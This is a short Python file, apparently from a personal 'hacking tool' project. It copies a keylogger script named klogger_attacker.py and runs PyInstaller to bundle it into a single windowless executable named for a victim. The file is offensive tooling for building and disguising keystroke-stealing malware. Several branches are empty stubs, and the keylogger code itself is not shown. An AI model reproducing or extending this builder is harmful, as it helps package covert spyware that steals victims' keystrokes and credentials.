import subprocess
import platform
import os
import shutil
class Installer():
    def __init__(self):
        pass
    def install(attname,victname, option = None):
        if option == "py":
            pass

        else:
            if platform.system() == "Windows":
                pass
            else:
                shutil.copy(f"/home/debian/Documenti/python_projects/Ste-hacking-tool/klogger/klogger_attacker.py",f"/home/debian/Documenti/python_projects/Ste-hacking-tool/outputs/{attname}.py")
            subprocess.run([
                "python3",
                "-m",
                "PyInstaller",
                "--onefile",
                "--windowed",
                "--name", victname,
                "--distpath", "../outputs/",
                "main.py"
            ], check=True)

                    